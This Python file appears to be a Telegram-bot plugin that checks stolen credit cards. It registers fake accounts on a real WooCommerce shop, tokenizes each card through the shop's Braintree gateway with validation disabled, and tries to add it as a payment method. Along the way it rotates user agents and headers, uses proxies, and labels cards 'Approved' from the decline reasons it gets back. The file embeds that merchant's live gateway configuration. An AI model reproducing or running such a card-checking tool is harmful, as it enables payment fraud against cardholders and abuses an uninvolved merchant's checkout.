from httpx import AsyncClient, RequestError, TimeoutException
import random
import string
import json
import base64
import asyncio
from faker import Faker
import logging
import re
from plugins.tools.address import fakexy 
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("pyrogram.parser.html").setLevel(logging.WARNING)
logging.basicConfig(level=logging.ERROR)

async def get_random_string(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for _ in range(length))

async def get_str(data: str, first: str, last: str) -> str:
    return str(data).split(str(first))[1].split(str(last))[0]

def generate_random_headers():
    sec_ch_ua = random.choice([
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36'
    ])
    sec_ch_ua_mobile = random.choice(['?0', '?1'])
    sec_ch_ua_platform = random.choice(['Windows', 'macOS', 'Linux', 'Android', 'iOS'])

    return {
        'sec-ch-ua': sec_ch_ua,
        'sec-ch-ua-mobile': sec_ch_ua_mobile,
        'sec-ch-ua-platform': sec_ch_ua_platform
    }

async def retry_request(session, url, method='get', headers=None, data=None, json_data=None, retries=3, delay=5):
    for attempt in range(retries):
        try:
            if method == 'get':
                response = await session.get(url, headers=headers)
            elif method == 'post':
                response = await session.post(url, headers=headers, data=data, json=json_data)
            response.raise_for_status()
            return response
        except RequestError as e:
            logging.error(f"Attempt {attempt + 1} failed: {e}")
            if attempt < retries - 1:
                await asyncio.sleep(delay)
    raise RequestError(f"Failed after {retries} attempts")

async def klk(cc, mes, ano, cvv, proxyg):
    email = await get_random_string(10) + "@gmail.com"
    password = await get_random_string(10)

    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera']
    os = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64', 'Windows NT 6.1', 'iPhone; CPU iPhone OS 13_5 like Mac OS X']
    versions = ['86.0', '87.0', '88.0', '89.0', '90.0']
    user_agent = f"Mozilla/5.0 ({random.choice(os)}) AppleWebKit/537.36 (KHTML, like Gecko) {random.choice(browsers)}/{random.choice(versions)}"

    try:
        async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
            myip = await session.get("https://api.ipify.org/")
            print(myip.text)
            response = await retry_request(session, 'https://mamoi.me/my-account')
            match = re.search(r'woocommerce-register-nonce" value="([^"]+)"', response.text)
            register_nonce = match.group(1)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': user_agent,
            }
            
            data = {
                'email': email,
                'password': password,
                'terms': 'on',
                'terms-field': '1',
                'woocommerce-register-nonce': register_nonce,
                '_wp_http_referer': '/my-account/orders/',
                'register': 'Register',
            }
            response = await retry_request(session, 'https://mamoi.me/my-account', method='post', headers=headers, data=data)
            response = await retry_request(session, 'https://mamoi.me/my-account/edit-address/billing/')
            billing_nonce = re.search(r'woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
            billing_nonce = match.group(1)
            register_nonce = match.group(1)
            fake = Faker()
            data = {
                'billing_purchase_type': 'person',
                'billing_first_name': fake.first_name(),
                'billing_last_name': fake.last_name(),
                'billing_vat_number': '',
                'billing_company': fake.company(),
                'billing_country': fake.country_code(),
                'billing_state': fake.state_abbr(),
                'billing_address_1': fake.street_address(),
                'billing_address_2': fake.city(),
                'billing_city': fake.city(),
                'billing_postcode': fake.zipcode(),
                'billing_phone': fake.phone_number(),
                'billing_email': fake.email(),
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': billing_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/',
                'action': 'edit_address',
            }
            response = await retry_request(session, 'https://mamoi.me/my-account/edit-address/billing/', method='post', headers=headers, data=data)
            response = await retry_request(session, 'https://mamoi.me/my-account/add-payment-method/')
            token = re.search(r'wc_braintree_client_token\s*=\s*\["(.*?)"\]', response.text).group(1) if re.search(r'wc_braintree_client_token\s*=\s*\["(.*?)"\]', response.text) else None
            payment_nonce = re.search(r'woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1) if re.search(r'woocommerce-add-payment-method-nonce" value="(.*?)"', response.text) else None
           
            B64_ = base64.b64decode(token)
            finger = json.loads(B64_)['authorizationFingerprint']

            random_headers = generate_random_headers()
            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'authorization': 'Bearer ' + finger,
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i', # peneland
                'referer': 'https://assets.braintreegateway.com/',
                'sec-ch-ua': random_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': random_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': random_headers['sec-ch-ua-platform'],
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': user_agent,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': 'c112d4f1-dde1-4bb5-8ec1-f5afe36ae810',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mes,
                            'expirationYear': ano,
                            'billingAddress': {
                                'postalCode': fake.zipcode(),
                                'streetAddress': fake.street_address(),
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            req8 = await retry_request(session, 'https://payments.braintree-api.com/graphql', method='post', json_data=json_data, headers=headers)
            card_token = req8.json()['data']['tokenizeCreditCard']['token']

            random_headers = generate_random_headers()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://mamoi.me',
                'priority': 'u=0, i',
                'referer': 'https://mamoi.me/my-account/add-payment-method/',
                'sec-ch-ua': random_headers['sec-ch-ua'],
                'sec-ch-ua-mobile': random_headers['sec-ch-ua-mobile'],
                'sec-ch-ua-platform': random_headers['sec-ch-ua-platform'],
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': user_agent,
            }

            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': card_token,
                'braintree_cc_device_data': '{"device_session_id":"1282e0f5ffa0db6b9b06f698902b39be","fraud_merchant_id":null,"correlation_id":"24a07c5376c4b53e992b84c7ea76685c"}',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/r6pz9pg99n4yr7nj/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/r6pz9pg99n4yr7nj"},"merchantId":"r6pz9pg99n4yr7nj","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":[],"creditCards":{"supportedCardTypes":["Maestro", "UK Maestro", "MasterCard", "Visa", "American Express"]},"threeDSecureEnabled":true,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIzYWJiOTlhZS1lZGJiLTQyOGEtYjc1Mi1iM2MzNDQ4ZTQ5Y2UiLCJpYXQiOjE3MTcwMTM0ODAsImV4cCI6MTcxNzAyMDY4MCwiaXNzIjoiNjIyOTQ2MDQwMDk5ZTQ3N2U1Yzg1YmU3IiwiT3JnVW5pdElkIjoiNjIyOTQ2MDQwMDk5ZTQ3N2U1Yzg1YmU2In0.zQ7KAC7dqJ6L7m3OaKs5v7AmweG5XmsPeUb7Pn4y36E"},"paypalEnabled":true,"paypal":{"displayName":"Eljot sp. z o.o.","clientId":"AbJmMBc7PFpvzzEqiBzqXuSIy-jFIAyPtzdj5jNT8oV8pZ_z78TlITye7IiO8pc48aS-Xhvxt6LKkrNv","privacyUrl":null,"userAgreementUrl":null,"assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"eljotspzooEUR","payeeEmail":null,"currencyIsoCode":"EUR"}}',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }

            req9 = await retry_request(session, 'https://mamoi.me/my-account/add-payment-method/', method='post', data=data, headers=headers)

            if "Payment method successfully added." in req9.text:
                mensaje = "Approved (1000)"
                status = "Approved ✅"
            else:
                try:
                    split_reason = req9.text.split('Reason: ', 1)
                    if len(split_reason) > 1:
                        split_message = split_reason[1].split('</li>', 1)
                        if len(split_message) > 1:
                            mensaje = split_message[0].strip()
                            if "Card Issuer Declined CVV" in mensaje or "Insufficient Funds" in mensaje:
                                status = "Approved ✅"
                            elif "Gateway Rejected: risk_threshold" in mensaje:
                                status = "Declined ❌"
                                mensaje = "Braintree Rejected: Risk"
                            else:
                                status = "Declined ❌"
                        else:
                            status = "Error ⚠️!"
                            mensaje = "Unexpected format in response (missing </li>).😓"
                    else:
                        status = "Error ⚠️!"
                        mensaje = "Unexpected format in response (missing Reason:).😓"
                except Exception as e:
                    linea = str(e.__traceback__.tb_lineno)
                    logging.error(f"An unexpected error occurred: {e} at line {linea}")
                    return 'Error ⚠️!', f'An unexpected error occurred with token at line {linea}.😓'
            return status, mensaje

    except (RequestError, TimeoutException, json.JSONDecodeError) as e:
        linea = str(e.__traceback__.tb_lineno)
        logging.error(f"An error occurred: {e} at line {linea}")
        return 'Error ⚠️!', f'An unexpected error occurred with Requests at line {linea}.😓'
    except Exception as e:
        linea = str(e.__traceback__.tb_lineno)
        logging.error(f"An unexpected error occurred: {e} at line {linea}")
        return 'Error ⚠️!', f'An unexpected error occurred with nonce at line {linea}.😓'
